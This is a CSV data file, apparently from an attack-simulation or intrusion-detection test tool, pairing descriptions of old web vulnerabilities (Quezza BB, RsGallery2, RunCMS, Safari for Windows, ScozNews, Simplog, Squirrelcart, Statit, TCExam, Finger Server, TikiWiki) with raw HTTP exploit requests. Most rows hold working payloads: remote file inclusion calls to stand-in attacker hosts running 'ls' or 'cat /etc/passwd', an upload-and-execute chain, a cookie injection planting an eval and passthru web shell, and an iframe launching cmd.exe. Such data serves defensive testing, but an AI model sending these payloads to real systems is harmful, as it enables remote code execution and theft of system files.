XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿quezza_cmi.xml,Quezza BB 1.0 (quezza_root_path) File Inclusion Vulnerability.,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via class_template.php's quezza_root_path parameter. Docebo is a web based application which typically listens on port 80.,HTTP,TCP,"GET /quezza%2Fincludes%2Fclass_template.php%3Fquezza_root_path%3Dhttp%3A%2F%2F%5Battacker%5D%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
quezza_cmi.xml,Quezza BB 1.0 (quezza_root_path) File Inclusion Vulnerability.,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via class_template.php's quezza_root_path parameter. Docebo is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿rsgallery_cmi.xml,RsGallery2 1.11.2 (rsgallery.html.php) File Include Vulnerability,"This threat sends a crafted HTTP GET query containing a url to a file to be included in the returned page via  the rsgallery.html.php ""mosConfig_absolute_path"" parameter. RsGallery2 is a web based application which typically listens on port 80.",HTTP,TCP,"GET /joomlapath%2Fcomponents%2Fcom_rsgallery2%2Frsgallery.html.php%3FmosConfig_absolute_path%3Dhttp%3A%2F%2Fwww.attacker.com%2F HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
rsgallery_cmi.xml,RsGallery2 1.11.2 (rsgallery.html.php) File Include Vulnerability,"This threat sends a crafted HTTP GET query containing a url to a file to be included in the returned page via  the rsgallery.html.php ""mosConfig_absolute_path"" parameter. RsGallery2 is a web based application which typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿runcms_cmi.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,POST class/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=&Type=File&CurrentFolder= HTTP/1.1||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------7d529a1d23092a||0D 0A ||User-Agent||3A || Sun-tzu giving you the pain||0D 0A ||Host||3A || www.example.com||0D 0A ||Content-Length||3A || 194||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A ||-----------------------------7d529a1d23092a||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||NewFile||22 3B || filename=||22 ||suntzu8005.86630494448||22 0D 0A ||Content-Type||3A 0D 0A 0D 0A 0D 0A ||-----------------------------7d529a1d23092a--||0D 0A 0D 0A 0D 0A ||GET suntzu8005.86630494448?cmd= HTTP/1.1||0D 0A ||User-Agent||3A || GoogleBot/1.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A 0D 0A 0D 0A ||GET modules/newbb_plus/class/class.forumposts.php?cmd=&bbPath[path]= HTTP/1.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A 0D 0A 0D 0A ||GET modules/newbb_plus/class/forumpollrenderer.php?cmd=&bbPath[path]=/&xoopsConfig[language]=suntzu HTTP/1.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || Close||0D 0A 0D 0A 0D 0A||
runcms_cmi.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿runcms_cmi_b.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,POST editor/filemanager/browser/default/connectors/php/connector.php?Command=&Type=File&CurrentFolder= HTTP/1.1||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------7d529a1d23092a||0D 0A ||User-Agent||3A || Sun-tzu giving you the pain||0D 0A ||Host||3A || www.example.com||0D 0A ||Content-Length||3A || 194||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A ||-----------------------------7d529a1d23092a||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||NewFile||22 3B || filename=||22 ||suntzu3423.18748782712||22 0D 0A ||Content-Type||3A 0D 0A 0D 0A 0D 0A ||-----------------------------7d529a1d23092a--||0D 0A 0D 0A 0D 0A ||GET suntzu3423.18748782712?cmd=cat%20/etc/passwd HTTP/1.1||0D 0A ||User-Agent||3A || GoogleBot/1.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
runcms_cmi_b.xml,RunCMS Remote Code Execution Vulnerability,This threat sends a crafted POST payload containing PHP code that when retrieved using a remote file inclusion flaw allows arbitrary command execution. RunCMS is a web application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿safari_windows_cmi.xml,Safari 3 for Windows Beta Remote Command Execution Vulnerability,This threat demonstrates a flaw in Apple Safari for Windows that allows for execution of arbitrary commands via shell metacharacters in a URI in the SRC of an IFRAME embedded in a web page. This attack is delivered via port 80.,HTTP,TCP,GET /index.html HTTP/1.0||0D 0A ||Host||3A || www.site.net||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1)||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
safari_windows_cmi.xml,Safari 3 for Windows Beta Remote Command Execution Vulnerability,This threat demonstrates a flaw in Apple Safari for Windows that allows for execution of arbitrary commands via shell metacharacters in a URI in the SRC of an IFRAME embedded in a web page. This attack is delivered via port 80.,HTTP,TCP,"HTTP/1.0 200 OK||0D 0A ||Wed, 6 Jun 2007 10||3A ||08||3A ||40 GMT||0D 0A ||Server||3A || Apache||0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content Type||3A || text/html||0D 0A 0D 0A ||<html><body>||0D 0A ||<iframe src='gopher||3A ||//gopher.std.com/||22 || -chrome ||22 ||javascript||3A ||C=Components.classes||3B ||I=Components.interfaces||3B ||file=C[&#39||3B ||@mozilla.org/file/local||3B ||1&#39||3B ||].createInstance(I.nsILocalFile)||3B ||file.initWithPath(&#39||3B ||C||3A ||&#39||3B ||+String.fromCharCode(92)+String.fromCharCode(92)+&#39||3B ||Windows&#39||3B ||+String.fromCharCode(92)+String.fromCharCode(92)+&#39||3B ||System32&#39||3B ||+String.fromCharCode(92)+String.fromCharCode(92)+&#39||3B ||cmd.exe&#39||3B ||)||3B ||process=C[&#39||3B ||@mozilla.org/process/util||3B ||1&#39||3B ||].createInstance(I.nsIProcess)||3B ||process.init(file)||3B ||process.run(true&#44||3B ||{}&#44||3B ||0)||3B ||alert(process)'></iframe>process.init(file)||3B ||process.run(true,{},0)||3B ||alert(process)||0D 0A ||</body></html>||0D 0A||"
﻿scoznews_cmi.xml,ScozNet ScozNews Multiple Remote File Include Vulnerabilities,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via template.php's CONFIG[main_path] parameter. ScozNews is a web based application which typically listens on port 80.,HTTP,TCP,"GET /scozanews%2Fcron.php%3FROOT_PATH%3Dhttp%3A%2F%2Fwww.attacker.com%2Fcmd.txt%3F%26cmd%3Dls HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
scoznews_cmi.xml,ScozNet ScozNews Multiple Remote File Include Vulnerabilities,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via template.php's CONFIG[main_path] parameter. ScozNews is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿simplog_cmi.xml,Simplog  0.9.2  Remote Command Execution Exploit,"This threat exploits simplog by inserting a url into a cookie variable which allows for an arbitrary PHP file inclusion, this code is then executed by the server. Simplog is a web application and typically listens on port 80.",HTTP,TCP,GET /simplog/doc/index.php HTTP/1.0||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Cookie||3A || s=http||3A ||//somehost.com%2fsuntzu||3B || cmd=+cat+%2Fetc%2Fpasswd||3B 0D 0A ||Connection||3A || Close||0D 0A 0D 0A 0D 0A||
simplog_cmi.xml,Simplog  0.9.2  Remote Command Execution Exploit,"This threat exploits simplog by inserting a url into a cookie variable which allows for an arbitrary PHP file inclusion, this code is then executed by the server. Simplog is a web application and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿squirrelcart_cmi.xml,Squirrelcart 2.2.0 (cart_content.php) Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cart_content.php's cart_isp_root parameter. Squirrelcart is a web based application which typically listens on port 80.,HTTP,TCP,"GET /cart_content.php%3Fcart_isp_root%3Dhttp%3A%2F%2Fyourhost%2Fcmd.gif%3Fcmd%3Dls HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
squirrelcart_cmi.xml,Squirrelcart 2.2.0 (cart_content.php) Remote File Inclusion,This threat send a crafted HTTP query containing a local or remote path to a file which is included into the PHP source via cart_content.php's cart_isp_root parameter. Squirrelcart is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿statit_cmi.xml,"Statit V4 Remote File Inclusion exploit
",This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the statitpath argument. Statit is a web application with typically listens on port 80. ,HTTP,TCP,"GET /visible_count_inc.php?statitpath=http||3A ||//www.atacker.com/cmd.php?&cmd=cat%20/etc/passwd HTTP/1.1||0D 0A ||TE||3A || deflate,gzip||3B ||q=0.3||0D 0A ||Connection||3A || TE, close||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || libwww-perl/5.803||0D 0A 0D 0A 0D 0A||"
statit_cmi.xml,"Statit V4 Remote File Inclusion exploit
",This threat sends a crafted HTTP GET query which allows an arbitrary file inclusion via the statitpath argument. Statit is a web application with typically listens on port 80. ,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿tcexam_cmi.xml,"TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
",This threat demonstrates a shell injection flaw via a php cookie session variable which can be freely set by the attacker. This threat is delivered by the HTTP protocol on port 80.,HTTP,TCP,GET /tcexam/public/code/index.php HTTP/1.0||0D 0A ||Host||3A || google.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Cookie||3A || SessionUserLang=%2F..%2F%0Aeval%28%24_SERVER%5BHTTP_CMD%5D%29%3B%3F%3E%23%2F..%2Fsuntzu||3B 0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||
tcexam_cmi.xml,"TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
",This threat demonstrates a shell injection flaw via a php cookie session variable which can be freely set by the attacker. This threat is delivered by the HTTP protocol on port 80.,HTTP,TCP,GET /tcexam/cache/suntzu.php HTTP/1.0||0D 0A ||Host||3A || google.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||CMD||3A || echo '_delim_'||3B ||error_reporting(7)||3B ||set_time_limit(0)||3B ||passthru($_SERVER[HTTP_C])||3B ||echo '_delim_'||3B 0D 0A ||C||3A ||  ls -la||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
tcexam_cmi.xml,"TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
TCExam <= 4.0.011 $_COOKIE[\""SessionUserLang\""] shell injection exploit
",This threat demonstrates a shell injection flaw via a php cookie session variable which can be freely set by the attacker. This threat is delivered by the HTTP protocol on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿thefingerserver_cmi.xml,Finger Server Pipe Vulnerability,This threat sends a crafted url to a web based finger script which doesnt sanitize user supplied data allowing arbitrary command execution using the pipe character.The Finger Server is a web based application which typically listens on port 80.,HTTP,TCP,"GET /finger.cgi?action=archives&cmd=specific&filename=99.10.28.15.23.username.||7C ||cat%20/etc/passwd||7C || HTTP/1.0||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A 0D 0A||"
thefingerserver_cmi.xml,Finger Server Pipe Vulnerability,This threat sends a crafted url to a web based finger script which doesnt sanitize user supplied data allowing arbitrary command execution using the pipe character.The Finger Server is a web based application which typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿tikiwiki_pref_cmi.xml,TikiWiki tiki-user_preferences.php Command Injection,"This threat sends a crafted HTTP Request with with a modified URL string containing an invalid language name, this name is used directly to access the language include file which is unchecked and can be used to access arbitrary files, if that file contains PHP it will be also be executed. TikiWiki is a web application that typically listens on port 80.",HTTP,TCP,POST /scripts/tikiwiki/tiki-user_preferences.php HTTP/1.0||0D 0A ||User-Agent||3A || Wget/1.9||0D 0A ||Host||3A || www.example.com||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A ||Content-Length||3A || 60||0D 0A ||Cookie||3A || PHPSESSID=57d0a0e9e382874a4b142bda6a8afbe4||0D 0A 0D 0A ||&language=../setup.sh%00&user_dbl=on&prefs=Change+preference
